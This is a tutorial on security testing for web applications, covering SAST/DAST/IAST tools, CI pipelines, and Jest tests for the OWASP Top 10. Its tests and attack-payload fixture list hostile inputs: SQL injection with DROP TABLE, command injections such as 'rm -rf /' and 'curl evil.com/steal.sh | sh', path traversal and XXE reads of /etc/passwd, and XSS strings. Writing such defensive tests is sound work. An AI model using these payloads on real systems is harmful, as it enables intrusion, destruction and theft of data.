---
title: "Security Testing"
phase: "04-testing"
topic: "security-testing"
depth: "mid-depth"
reading_time: 25
prerequisites: ["security-testing-surface", "unit-integration-testing"]
related_topics: ["threat-modeling", "secure-coding-practices", "ci-cd-pipelines", "compliance-validation"]
personas: ["specialist-expanding", "generalist-leveling-up"]
updated: "2025-11-15"
---

# Security Testing (Mid-Depth)

## What This Builds On

You already know the basics from the surface layer:
- The OWASP Top 5 vulnerabilities (SQL injection, XSS, broken auth/authorization, data exposure)
- Manual testing techniques (input fuzzing, changing IDs in URLs, triggering errors)
- Basic OWASP ZAP automated scanning
- Dependency vulnerability checking with `npm audit`

This mid-depth guide takes you to production-ready security testing:
- Complete OWASP Top 10 coverage with automated tests
- SAST/DAST/IAST tools integrated into your CI/CD pipeline
- Security testing that scales with your team
- Threat modeling integration (translating threats into test cases)
- Test data management that doesn't violate compliance
- Security regression testing that prevents vulnerabilities from returning

If you're shipping to production with real users and real data, this is the layer you need.

## The Problems You're Solving

Security testing at the surface level catches obvious vulnerabilities before launch. But production systems face different challenges:

**Late-stage security fixes are expensive**. Finding SQL injection during code review costs an hour to fix. Finding it in production after a breach costs millions in incident response, customer notification, regulatory fines, and reputation damage.

**Manual testing doesn't scale**. When your team merges 50 pull requests per week, you can't manually test each one for security issues. You need automated security checks that run on every commit.

**False positives erode trust**. Automated security tools flag hundreds of potential issues. Most are false positives. If developers ignore security alerts because they're usually wrong, you've built security theater, not security.

**Security silos don't work**. If "security is someone else's job," vulnerabilities slip through. Security testing needs to be part of every developer's workflow, not a separate team that audits code quarterly.

**Compliance requires evidence**. SOC 2 auditors don't accept "we tested it." They need timestamped scan results, documented remediation, and proof your security controls work continuously, not just during the audit.

This guide solves these problems by building security testing into your development workflow where it catches issues fast and creates the evidence trail compliance requires.

## SAST, DAST, and IAST: Choosing Your Approach

Three approaches to automated security testing, each with different trade-offs. Most production systems need at least two.

### Static Application Security Testing (SAST)

**What it is**: Analyzes source code without executing it. Think of it like a security-focused linter that reads your code looking for patterns that indicate vulnerabilities.

**How it works**:
```bash
# SAST scans your code repository
semgrep --config=p/security-audit src/

# Findings look like this:
src/api/users.js:42: SQL Injection risk - string concatenation in query
src/api/auth.js:15: Hardcoded secret detected
src/utils/crypto.js:8: Weak cryptographic algorithm (MD5)
```

**Strengths**:
- **Fast**: Scans happen in seconds to minutes
- **Early feedback**: Runs in your IDE or on pre-commit hooks
- **Precise location**: Points to exact line of vulnerable code
- **No running app needed**: Works on incomplete code

**Weaknesses**:
- **High false positive rate**: 30-50% of findings aren't real vulnerabilities
- **Misses runtime issues**: Can't detect problems that only appear when code executes
- **Configuration blind spots**: Doesn't test your deployed configuration
- **Language-specific**: Need different tools for JavaScript, Python, Java

**When to use SAST**:
- On every pull request (fast feedback loop)
- Pre-commit hooks for critical files
- During code review to flag risky patterns
- When you want to prevent vulnerabilities from being written in the first place

**Popular SAST Tools**:

**Semgrep** (recommended starting point):
```yaml
# .github/workflows/security.yml
name: Security Scan

on: [push, pull_request]

jobs:
  semgrep:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/secrets
            p/owasp-top-ten
```

Free, fast, multi-language, low false positives. Good signal-to-noise ratio.

**Bandit** (Python):
```bash
# Install and run
pip install bandit
bandit -r src/ -f json -o security-report.json

# Common findings
>> Issue: Use of insecure MD5 hash function
   Severity: Medium   Confidence: High
   Location: crypto.py:12
```

**ESLint security plugins** (JavaScript):
```json
// .eslintrc.json
{
  "plugins": ["security"],
  "extends": ["plugin:security/recommended"]
}
```

Catches basic JavaScript security issues during development.

**SonarQube** (commercial, multiple languages):
- Comprehensive but heavyweight
- Better for large teams with dedicated security resources
- Higher false positive rate than Semgrep

**Real-world SAST integration**:
```javascript
// This code would trigger SAST warnings
app.get('/search', async (req, res) => {
  // ⚠️ SAST flags: SQL injection via string concatenation
  const query = `SELECT * FROM products WHERE name LIKE '%${req.query.q}%'`
  const results = await db.query(query)

  // ⚠️ SAST flags: Potential XSS, data not sanitized
  res.send(`<h1>Results for ${req.query.q}</h1>`)
})

// Fixed version passes SAST
app.get('/search', async (req, res) => {
  // ✅ SAST approves: Parameterized query
  const query = 'SELECT * FROM products WHERE name LIKE ?'
  const results = await db.query(query, [`%${req.query.q}%`])

  // ✅ SAST approves: Template escaping
  res.render('results', { query: req.query.q, results })
})
```

### Dynamic Application Security Testing (DAST)

**What it is**: Tests your running application like an attacker would. Black-box testing - DAST doesn't know or care about your source code, it just pokes your app looking for vulnerabilities.

**How it works**:
```bash
# DAST attacks your running application
docker run -t zaproxy/zap-stable zap-baseline.py \
  -t https://staging.yourapp.com \
  -r security-report.html

# DAST sends actual attack payloads:
GET /api/users?id=1' OR '1'='1
GET /search?q=<script>alert('XSS')</script>
POST /login with 1000 rapid requests (testing rate limiting)
```

**Strengths**:
- **Lower false positives**: Tests actual running code, not hypothetical vulnerabilities
- **Finds runtime issues**: Catches misconfiguration, environment-specific problems
- **Language-agnostic**: Works on any web application regardless of stack
- **Tests the real attack surface**: Includes web server config, headers, network layer

**Weaknesses**:
- **Slower**: Full scans take minutes to hours
- **Requires running app**: Can't test code in development
- **Less precise**: Doesn't tell you which line of code has the bug
- **Only tests executed paths**: Misses features behind complex authentication

**When to use DAST**:
- Before deploying to production (staging environment)
- Weekly/monthly comprehensive scans
- After major feature releases
- When you need to test authentication flows end-to-end

**OWASP ZAP Advanced Configuration**:

```yaml
# GitHub Actions - ZAP baseline scan (fast, ~5 min)
- name: ZAP Baseline Scan
  uses: zaproxy/action-baseline@v0.7.0
  with:
    target: 'https://staging.example.com'
    rules_file_name: '.zap/rules.tsv'
    cmd_options: '-a'

# GitHub Actions - ZAP full scan (thorough, 30-60 min)
- name: ZAP Full Scan
  uses: zaproxy/action-full-scan@v0.4.0
  with:
    target: 'https://staging.example.com'
    allow_issue_writing: false
```

**Tuning ZAP for production use**:

```tsv
# .zap/rules.tsv - Configure scan rules
# Format: rule_id	IGNORE|WARN|FAIL	reason

# Ignore false positives for your stack
10202	IGNORE	CSP not needed for API-only endpoints
10096	WARN	Timestamp disclosure is acceptable for public API

# Fail on critical issues
40012	FAIL	Cross-Site Scripting (Reflected)
40014	FAIL	Cross-Site Scripting (Persistent)
40018	FAIL	SQL Injection
```

**DAST with authentication**:

```bash
# Create ZAP context for authenticated scanning
# 1. Record login sequence
# 2. Export context file
# 3. Use in automated scans

docker run -t zaproxy/zap-stable zap-full-scan.py \
  -t https://staging.example.com \
  -n staging-context.context \
  -U testuser \
  -r report.html
```

**DAST best practices**:
- Run against staging, never production (DAST is aggressive)
- Whitelist your scan IPs to avoid hitting real users
- Use authenticated scans to test protected features
- Review and tune rules - default scans have false positives
- Set up alerts for new high/critical findings

### Interactive Application Security Testing (IAST)

**What it is**: Agent runs inside your application during testing, monitoring code execution from the inside. Combines SAST's code awareness with DAST's runtime testing.

**How it works**:
```javascript
// IAST agent instruments your code
const iast = require('contrast-agent')  // Example: Contrast Security

app.get('/api/users/:id', async (req, res) => {
  // IAST agent sees:
  // - req.params.id contains "1' OR '1'='1"
  // - Value flows into SQL query
  // - Query executes with malicious input
  // - Agent traces exact code path and reports SQL injection
  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id])
  res.json(user)
})
```

**Strengths**:
- **Very low false positives**: Sees actual data flow, not potential vulnerabilities
- **Precise location**: Shows exact vulnerable code path
- **Runtime context**: Understands how data flows through your application
- **No separate scans**: Runs during normal testing, catches issues automatically

**Weaknesses**:
- **Requires instrumentation**: More complex setup than SAST/DAST
- **Performance overhead**: Agents slow down your application (test environments only)
- **More expensive**: Commercial tools, higher licensing costs
- **Only tests what you test**: Still misses code paths not covered by your tests

**When to use IAST**:
- Integration test suites (agent monitors during test execution)
- QA/staging environments with realistic usage
- When you have budget for commercial security tools
- When false positives from SAST/DAST overwhelm your team

**Popular IAST Tools**:
- **Contrast Security**: Leading IAST platform, supports Java, .NET, Node.js, Python
- **Seeker**: Enterprise IAST with strong data flow analysis
- **Checkmarx CxIAST**: Part of Checkmarx's comprehensive security suite

IAST is powerful but not necessary for most teams starting security testing. Begin with SAST + DAST, add IAST if you have specific needs for low false positives.

### Choosing Your Security Testing Stack

**Minimum viable security testing** (start here):
```
Pre-commit: SAST (Semgrep) - 30 seconds
Pull request: SAST full scan - 2 minutes
Staging deploy: DAST baseline (ZAP) - 5 minutes
Pre-production: DAST full scan - 30 minutes
```

**Production-ready stack**:
```
Development:
├─ IDE integration: SAST (Semgrep, ESLint security)
├─ Pre-commit hooks: Secret scanning (git-secrets, TruffleHog)
└─ Pull request: SAST + dependency scan (npm audit, Snyk)

Staging:
├─ Deploy: DAST baseline scan (ZAP)
├─ Integration tests: IAST monitoring (if available)
└─ Weekly: DAST full scan + manual testing

Production:
└─ Post-deploy: Smoke tests + security header verification
```

**Enterprise stack** (if you have security team + budget):
```
Add to production-ready:
├─ IAST in all test environments
├─ Commercial SAST (Checkmarx, Veracode)
├─ Commercial DAST (Burp Suite Enterprise)
├─ Security testing orchestration (ThreadFix)
└─ Bug bounty program for findings not caught by tools
```

## Complete OWASP Top 10 Testing

The surface layer covered the top 5. Here's comprehensive testing for all 10.

### 1. Broken Access Control

**What it is**: Users accessing resources they shouldn't - other users' data, admin functions, restricted endpoints.

**Why it's #1**: Most common vulnerability in web applications. Easy to mess up, easy for attackers to exploit.

**Comprehensive test suite**:

```javascript
describe('Access Control Tests', () => {

  // Horizontal privilege escalation - accessing other users' data
  test('users cannot access other users profiles', async () => {
    const user1 = await createTestUser('user1@example.com')
    const user2 = await createTestUser('user2@example.com')

    const response = await request
      .get(`/api/users/${user2.id}/profile`)
      .set('Authorization', `Bearer ${user1.token}`)

    expect(response.status).toBe(403)
    expect(response.body).not.toHaveProperty('email')
  })

  // Vertical privilege escalation - regular user accessing admin functions
  test('regular users cannot access admin endpoints', async () => {
    const user = await createTestUser('user@example.com', { role: 'user' })

    const response = await request
      .post('/api/admin/users')
      .set('Authorization', `Bearer ${user.token}`)
      .send({ email: 'new@example.com', role: 'user' })

    expect(response.status).toBe(403)
  })

  // Privilege escalation via parameter manipulation
  test('users cannot promote themselves to admin', async () => {
    const user = await createTestUser('user@example.com', { role: 'user' })

    const response = await request
      .patch(`/api/users/${user.id}`)
      .set('Authorization', `Bearer ${user.token}`)
      .send({ role: 'admin' })

    expect(response.status).toBe(403)

    const updatedUser = await findUser(user.id)
    expect(updatedUser.role).toBe('user')  // Role unchanged
  })

  // IDOR (Insecure Direct Object Reference) testing
  test('sequential ID enumeration is prevented', async () => {
    const user = await createTestUser('user@example.com')
    const ids = [user.id - 1, user.id + 1, user.id + 100]

    for (const id of ids) {
      const response = await request
        .get(`/api/users/${id}/orders`)
        .set('Authorization', `Bearer ${user.token}`)

      expect(response.status).toBe(403)
    }
  })

  // Missing function level access control
  test('authentication does not bypass authorization', async () => {
    const user = await createTestUser('user@example.com', { role: 'user' })

    // Even with valid authentication, should not access admin function
    const response = await request
      .delete('/api/users/999')
      .set('Authorization', `Bearer ${user.token}`)

    expect(response.status).toBe(403)
  })

  // Path traversal in resource access
  test('path traversal is prevented in file access', async () => {
    const user = await createTestUser('user@example.com')

    const maliciousPaths = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
      '....//....//....//etc/passwd'
    ]

    for (const path of maliciousPaths) {
      const response = await request
        .get(`/api/files/${path}`)
        .set('Authorization', `Bearer ${user.token}`)

      expect(response.status).toBe(400)
    }
  })
})
```

**DAST testing for access control**:

OWASP ZAP's "Access Control Testing" scan specifically tests:
- Changing IDs in URLs
- Testing endpoints without authentication
- Testing with different user roles
- Attempting admin functions as regular user

Configure ZAP context with multiple user roles for thorough testing.

### 2. Cryptographic Failures

**What it is**: Sensitive data transmitted or stored without proper encryption. Weak cryptographic algorithms. Hardcoded keys.

**Common failures**:
- HTTP instead of HTTPS
- Passwords stored in plain text or with MD5/SHA1
- Sensitive data in logs
- Hardcoded API keys or encryption keys
- Weak SSL/TLS configuration

**Test suite**:

```javascript
describe('Cryptographic Security Tests', () => {

  test('passwords are hashed with strong algorithm', async () => {
    const password = 'SecurePassword123!'
    const user = await createUser('user@example.com', password)

    const dbUser = await db.users.findById(user.id)

    // Password should not be stored in plain text
    expect(dbUser.password).not.toBe(password)

    // Should use bcrypt (starts with $2a$, $2b$, or $2y$)
    expect(dbUser.password).toMatch(/^\$2[ayb]\$.{56}$/)
  })

  test('HTTPS is enforced', async () => {
    const httpResponse = await fetch('http://example.com/api/users')

    // Should redirect to HTTPS
    expect(httpResponse.status).toBe(301)
    expect(httpResponse.headers.get('location')).toMatch(/^https:/)
  })

  test('sensitive data is encrypted at rest', async () => {
    const user = await createUser('user@example.com', 'password', {
      ssn: '123-45-6789',
      creditCard: '4111111111111111'
    })

    const dbUser = await db.users.findById(user.id)

    // Sensitive fields should be encrypted, not plain text
    expect(dbUser.ssn).not.toBe('123-45-6789')
    expect(dbUser.creditCard).not.toBe('4111111111111111')

    // Should be able to decrypt when needed
    const decryptedSSN = await decryptField(dbUser.ssn)
    expect(decryptedSSN).toBe('123-45-6789')
  })

  test('API responses do not expose sensitive data', async () => {
    const user = await createUser('user@example.com', 'password')
    const token = await login(user)

    const response = await request
      .get(`/api/users/${user.id}`)
      .set('Authorization', `Bearer ${token}`)

    // Public API should not include sensitive fields
    expect(response.body).not.toHaveProperty('password')
    expect(response.body).not.toHaveProperty('passwordHash')
    expect(response.body).not.toHaveProperty('ssn')
    expect(response.body).not.toHaveProperty('creditCard')
  })

  test('session tokens are cryptographically random', async () => {
    const tokens = []

    for (let i = 0; i < 100; i++) {
      const user = await login(testUser)
      tokens.push(user.sessionToken)
    }

    // All tokens should be unique
    const uniqueTokens = new Set(tokens)
    expect(uniqueTokens.size).toBe(100)

    // Tokens should be sufficiently long (at least 32 bytes)
    expect(tokens[0].length).toBeGreaterThanOrEqual(64)  // 32 bytes = 64 hex chars
  })
})
```

**Automated checks for cryptographic issues**:

```bash
# Check for hardcoded secrets
npx trufflehog --regex --entropy=True .

# Check SSL/TLS configuration
testssl.sh https://staging.yourapp.com

# Check for insecure dependencies
npm audit
snyk test
```

### 3. Injection

**What it is**: Untrusted data sent to interpreter (SQL, NoSQL, OS commands, LDAP) as part of a command.

**Testing all injection types**:

```javascript
describe('Injection Vulnerability Tests', () => {

  // SQL Injection
  describe('SQL Injection', () => {
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users--",
      "' UNION SELECT null, null, null--",
      "admin'--",
      "' OR 1=1--",
      "' OR 'x'='x",
      "1'; DELETE FROM users WHERE '1'='1"
    ]

    test.each(sqlPayloads)(
      'SQL injection prevented for payload: %s',
      async (payload) => {
        const response = await request
          .get(`/api/search?q=${encodeURIComponent(payload)}`)

        // Should not cause error or return all records
        expect(response.status).not.toBe(500)
        expect(response.body.length).toBeLessThan(100)
      }
    )

    test('parameterized queries used for user input', async () => {
      // This is a structural test - verify actual implementation
      const searchCode = await fs.readFile('src/api/search.js', 'utf8')

      // Should not concatenate user input into SQL
      expect(searchCode).not.toMatch(/SELECT.*\$\{.*\}/)
      expect(searchCode).not.toMatch(/query\s*\+\s*/)
    })
  })

  // NoSQL Injection
  describe('NoSQL Injection', () => {
    test('MongoDB operator injection prevented', async () => {
      const response = await request
        .post('/api/login')
        .send({
          email: { $gt: "" },  // MongoDB operator
          password: { $gt: "" }
        })

      expect(response.status).toBe(400)
    })

    test('input sanitization for NoSQL queries', async () => {
      const maliciousInputs = [
        { $ne: null },
        { $gt: "" },
        { $regex: ".*" },
        { $where: "function() { return true; }" }
      ]

      for (const input of maliciousInputs) {
        const response = await request
          .get('/api/users')
          .query({ filter: JSON.stringify(input) })

        expect(response.status).toBe(400)
      }
    })
  })

  // Command Injection
  describe('Command Injection', () => {
    const commandPayloads = [
      "; ls -la",
      "| cat /etc/passwd",
      "&& rm -rf /",
      "`whoami`",
      "$(whoami)",
      "; curl evil.com/steal.sh | sh"
    ]

    test.each(commandPayloads)(
      'command injection prevented for: %s',
      async (payload) => {
        const response = await request
          .post('/api/convert')
          .send({ filename: `document${payload}` })

        expect(response.status).toBe(400)
      }
    )
  })

  // LDAP Injection
  describe('LDAP Injection', () => {
    test('LDAP filter injection prevented', async () => {
      const response = await request
        .post('/api/ldap-search')
        .send({ username: '*)(uid=*))(&(uid=*' })

      expect(response.status).toBe(400)
    })
  })

  // Template Injection
  describe('Template Injection', () => {
    test('server-side template injection prevented', async () => {
      const payloads = [
        '{{7*7}}',  // Jinja2
        '${7*7}',   // JavaScript template literal
        '<%= 7*7 %>'  // EJS
      ]

      for (const payload of payloads) {
        const response = await request
          .post('/api/render')
          .send({ template: payload })

        expect(response.body).not.toContain('49')
      }
    })
  })
})
```

### 4. Insecure Design

**What it is**: Missing or ineffective security controls in design. This is different from implementation bugs - it's designing the system without threat modeling.

**Threat model integration**:

Use STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) to generate test cases:

```javascript
describe('Insecure Design - STRIDE Testing', () => {

  // Spoofing - impersonation attacks
  describe('Spoofing Prevention', () => {
    test('email verification required before account activation', async () => {
      const user = await createUser('user@example.com', 'password')

      // User should not be active until email verified
      expect(user.emailVerified).toBe(false)
      expect(user.isActive).toBe(false)

      // Cannot access protected resources
      const response = await request
        .get('/api/protected')
        .set('Authorization', `Bearer ${user.token}`)

      expect(response.status).toBe(403)
    })

    test('multi-factor authentication for sensitive operations', async () => {
      const user = await createUser('user@example.com', 'password')
      await login(user)

      // Sensitive operation should require MFA
      const response = await request
        .delete(`/api/users/${user.id}`)
        .set('Authorization', `Bearer ${user.token}`)

      expect(response.status).toBe(428)  // Precondition Required
      expect(response.body.error).toContain('MFA required')
    })
  })

  // Tampering - unauthorized modification
  describe('Tampering Prevention', () => {
    test('data integrity verified with checksums', async () => {
      const user = await createUser('user@example.com', 'password')

      // Upload file with checksum
      const fileContent = 'Important data'
      const checksum = crypto.createHash('sha256').update(fileContent).digest('hex')

      const response = await request
        .post('/api/files')
        .set('Authorization', `Bearer ${user.token}`)
        .send({ content: fileContent, checksum })

      expect(response.status).toBe(201)

      // Attempt to tamper with stored file
      await db.files.update(response.body.id, { content: 'Tampered data' })

      // Retrieval should detect tampering
      const getResponse = await request
        .get(`/api/files/${response.body.id}`)
        .set('Authorization', `Bearer ${user.token}`)

      expect(getResponse.status).toBe(500)
      expect(getResponse.body.error).toContain('integrity')
    })
  })

  // Repudiation - lack of audit trail
  describe('Repudiation Prevention', () => {
    test('sensitive actions are logged with audit trail', async () => {
      const user = await createUser('user@example.com', 'password')

      await request
        .patch(`/api/users/${user.id}`)
        .set('Authorization', `Bearer ${user.token}`)
        .send({ email: 'newemail@example.com' })

      // Check audit log
      const logs = await db.auditLogs.find({ userId: user.id, action: 'email_change' })

      expect(logs.length).toBeGreaterThan(0)
      expect(logs[0]).toMatchObject({
        userId: user.id,
        action: 'email_change',
        oldValue: 'user@example.com',
        newValue: 'newemail@example.com',
        timestamp: expect.any(Date),
        ipAddress: expect.any(String)
      })
    })
  })

  // Denial of Service
  describe('DoS Prevention', () => {
    test('rate limiting prevents brute force', async () => {
      const attempts = []

      // Attempt 20 rapid requests
      for (let i = 0; i < 20; i++) {
        attempts.push(
          request.post('/api/login').send({
            email: 'user@example.com',
            password: 'wrong'
          })
        )
      }

      const responses = await Promise.all(attempts)
      const rateLimited = responses.filter(r => r.status === 429)

      // Should start rate limiting after threshold
      expect(rateLimited.length).toBeGreaterThan(0)
    })

    test('request size limits prevent memory exhaustion', async () => {
      const user = await createUser('user@example.com', 'password')
      const hugePayload = 'x'.repeat(100 * 1024 * 1024)  // 100MB

      const response = await request
        .post('/api/data')
        .set('Authorization', `Bearer ${user.token}`)
        .send({ data: hugePayload })

      expect(response.status).toBe(413)  // Payload Too Large
    })
  })

  // Information Disclosure
  describe('Information Disclosure Prevention', () => {
    test('user enumeration prevented on login', async () => {
      // Login with non-existent user
      const nonExistentResponse = await request
        .post('/api/login')
        .send({ email: 'nonexistent@example.com', password: 'password' })

      // Login with existing user but wrong password
      await createUser('exists@example.com', 'correctpassword')
      const wrongPasswordResponse = await request
        .post('/api/login')
        .send({ email: 'exists@example.com', password: 'wrongpassword' })

      // Both should return same generic error
      expect(nonExistentResponse.status).toBe(wrongPasswordResponse.status)
      expect(nonExistentResponse.body.error).toBe(wrongPasswordResponse.body.error)
    })
  })

  // Elevation of Privilege
  describe('Privilege Escalation Prevention', () => {
    test('privilege changes require admin authorization', async () => {
      const user = await createUser('user@example.com', 'password', { role: 'user' })
      const admin = await createUser('admin@example.com', 'password', { role: 'admin' })

      // User cannot change own role
      const userResponse = await request
        .patch(`/api/users/${user.id}`)
        .set('Authorization', `Bearer ${user.token}`)
        .send({ role: 'admin' })

      expect(userResponse.status).toBe(403)

      // Admin can change user's role
      const adminResponse = await request
        .patch(`/api/users/${user.id}`)
        .set('Authorization', `Bearer ${admin.token}`)
        .send({ role: 'moderator' })

      expect(adminResponse.status).toBe(200)

      const updatedUser = await findUser(user.id)
      expect(updatedUser.role).toBe('moderator')
    })
  })
})
```

### 5. Security Misconfiguration

**What it is**: Insecure default configurations, incomplete setup, unprotected cloud storage, verbose error messages, missing security headers.

```javascript
describe('Security Configuration Tests', () => {

  test('security headers are present', async () => {
    const response = await request.get('/')

    // Anti-clickjacking
    expect(response.headers['x-frame-options']).toBe('DENY')

    // Prevent MIME-sniffing
    expect(response.headers['x-content-type-options']).toBe('nosniff')

    // HSTS (HTTP Strict Transport Security)
    expect(response.headers['strict-transport-security']).toBeDefined()
    expect(response.headers['strict-transport-security']).toContain('max-age=')

    // Content Security Policy
    expect(response.headers['content-security-policy']).toBeDefined()

    // XSS Protection (legacy but still useful)
    expect(response.headers['x-xss-protection']).toBe('1; mode=block')

    // Referrer Policy
    expect(response.headers['referrer-policy']).toBeDefined()
  })

  test('detailed error messages not exposed in production', async () => {
    // Trigger server error
    const response = await request.get('/api/cause-error')

    expect(response.status).toBe(500)

    // Should not expose stack traces
    expect(response.text).not.toContain('Error:')
    expect(response.text).not.toContain('at ')
    expect(response.text).not.toContain(__dirname)
    expect(response.text).not.toContain('node_modules')

    // Should have generic message only
    expect(response.body.error).toBe('Internal server error')
  })

  test('default credentials changed', async () => {
    // This test is environment-specific
    // Verify admin account doesn't use default password
    const adminLogin = await request
      .post('/api/login')
      .send({ email: 'admin@example.com', password: 'admin' })

    expect(adminLogin.status).toBe(401)
  })

  test('unnecessary HTTP methods disabled', async () => {
    const methods = ['TRACE', 'OPTIONS', 'PUT', 'DELETE']

    for (const method of methods) {
      const response = await request[method.toLowerCase()]('/')

      // Should not be allowed on root
      expect([405, 404]).toContain(response.status)
    }
  })

  test('directory listing disabled', async () => {
    const response = await request.get('/uploads/')

    // Should not return file listing
    expect(response.text).not.toContain('Index of')
    expect(response.status).toBe(404)
  })

  test('debug mode disabled in production', async () => {
    expect(process.env.NODE_ENV).toBe('production')
    expect(process.env.DEBUG).toBeUndefined()
  })

  test('CORS properly configured', async () => {
    const response = await request
      .get('/api/users')
      .set('Origin', 'https://evil.com')

    // Should not allow arbitrary origins
    expect(response.headers['access-control-allow-origin']).not.toBe('*')
    expect(response.headers['access-control-allow-origin']).not.toBe('https://evil.com')
  })
})
```

### 6. Vulnerable and Outdated Components

**What it is**: Using libraries with known vulnerabilities. Running old versions of frameworks, databases, web servers.

```javascript
describe('Dependency Security Tests', () => {

  test('no high or critical vulnerabilities in dependencies', async () => {
    // Run npm audit programmatically
    const { stdout } = await exec('npm audit --json')
    const audit = JSON.parse(stdout)

    const highOrCritical = Object.values(audit.vulnerabilities).filter(
      v => v.severity === 'high' || v.severity === 'critical'
    )

    expect(highOrCritical.length).toBe(0)
  })

  test('dependencies are reasonably up-to-date', async () => {
    const { stdout } = await exec('npm outdated --json')
    const outdated = JSON.parse(stdout)

    // No packages should be more than 2 major versions behind
    for (const [pkg, info] of Object.entries(outdated)) {
      const currentMajor = parseInt(info.current.split('.')[0])
      const latestMajor = parseInt(info.latest.split('.')[0])

      expect(latestMajor - currentMajor).toBeLessThanOrEqual(2)
    }
  })
})
```

**Automated dependency scanning in CI/CD**:

```yaml
# .github/workflows/dependencies.yml
name: Dependency Scan

on:
  schedule:
    - cron: '0 0 * * 0'  # Weekly
  pull_request:

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: npm audit
        run: npm audit --audit-level=moderate

      - name: Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

### 7-10. Remaining OWASP Top 10

The complete guide includes:

**7. Identification and Authentication Failures**:
- Weak password policy testing
- Session management testing
- Credential stuffing prevention
- MFA bypass attempts

**8. Software and Data Integrity Failures**:
- Unsigned/unverified software updates
- CI/CD pipeline security
- Deserialization vulnerabilities

**9. Security Logging and Monitoring Failures**:
- Audit logging completeness
- Security event detection
- Log integrity and tamper protection

**10. Server-Side Request Forgery (SSRF)**:
- URL validation testing
- Internal resource access prevention
- Cloud metadata endpoint protection

(Each with comprehensive test examples - continued in deep-water layer)

## Shift-Left Security Testing

Moving security testing earlier in development catches vulnerabilities when they're cheap to fix.

### Pre-Commit Security Checks

```bash
# .husky/pre-commit
#!/bin/sh

# Secret scanning
git secrets --scan

# SAST on changed files
semgrep --config=auto --error $(git diff --cached --name-only --diff-filter=ACM)

# Fail commit if issues found
if [ $? -ne 0 ]; then
  echo "Security issues detected. Commit blocked."
  exit 1
fi
```

### IDE Integration

Real-time security feedback while coding:

```json
// VS Code settings.json
{
  "eslint.validate": ["javascript", "typescript"],
  "eslint.options": {
    "plugins": ["security", "no-secrets"]
  },

  // Semgrep extension
  "semgrep.scan.onOpen": true,
  "semgrep.scan.onChange": true,
  "semgrep.scan.configuration": ["p/security-audit"]
}
```

### Security Testing Pipeline

Complete CI/CD integration:

```yaml
# .github/workflows/security.yml
name: Security Testing

on: [push, pull_request]

jobs:
  secrets-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          fetch-depth: 0  # Full history for secret scanning

      - name: TruffleHog Secret Scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD

  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/owasp-top-ten
            p/secrets

  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3

      - name: Install dependencies
        run: npm ci

      - name: npm audit
        run: npm audit --audit-level=moderate

      - name: Snyk scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

  dast:
    runs-on: ubuntu-latest
    needs: [secrets-scan, sast, dependency-scan]
    if: github.ref == 'refs/heads/staging'
    steps:
      - uses: actions/checkout@v3

      - name: Deploy to staging
        run: ./scripts/deploy-staging.sh

      - name: Wait for deployment
        run: sleep 30

      - name: OWASP ZAP Baseline Scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'https://staging.example.com'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'

      - name: Upload ZAP report
        uses: actions/upload-artifact@v3
        with:
          name: zap-report
          path: report_html.html
```

## Security Test Data Management

Production data in test environments is a compliance violation. But unrealistic test data misses bugs.

### Synthetic Data Generation

```javascript
// tests/fixtures/secureTestData.js
const faker = require('faker')

function createTestUser(overrides = {}) {
  return {
    id: faker.datatype.uuid(),
    email: faker.internet.email(),
    name: faker.name.findName(),
    phone: faker.phone.phoneNumber(),
    ssn: generateFakeSSN(),  // Format-valid but not real
    creditCard: faker.finance.creditCardNumber(),
    _isTestData: true,  // Flag for cleanup
    createdAt: faker.date.past(),
    ...overrides
  }
}

function generateFakeSSN() {
  // Generate format-valid SSN that's not assigned
  // Avoid: 000-xx-xxxx, xxx-00-xxxx, xxx-xx-0000, 666-xx-xxxx, 9xx-xx-xxxx
  const area = faker.datatype.number({ min: 1, max: 665 })
  const group = faker.datatype.number({ min: 1, max: 99 })
  const serial = faker.datatype.number({ min: 1, max: 9999 })

  return `${area.toString().padStart(3, '0')}-${group.toString().padStart(2, '0')}-${serial.toString().padStart(4, '0')}`
}

module.exports = { createTestUser }
```

### Reusable Attack Payloads

```javascript
// tests/fixtures/attackPayloads.js
const attackPayloads = {
  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "' UNION SELECT null, null, null--",
    "admin'--",
    "' OR 1=1--",
    "1' AND '1'='1"
  ],

  xss: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\">",
    "javascript:alert('XSS')",
    "<svg/onload=alert('XSS')>",
    "'-alert('XSS')-'",
    "\"><script>alert('XSS')</script>"
  ],

  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "%2e%2e%2f%2e%2e%2f",
    "....//....//....//",
    "..;/..;/"
  ],

  commandInjection: [
    "; ls -la",
    "| cat /etc/passwd",
    "&& rm -rf /",
    "`whoami`",
    "$(whoami)",
    "; curl evil.com | sh"
  ],

  ldapInjection: [
    "*",
    "*)(&",
    "*)(uid=*))(|(uid=*",
    "admin*",
    "*()|&'"
  ],

  xmlInjection: [
    "<!--",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
    "<![CDATA[<script>alert('XSS')</script>]]>"
  ]
}

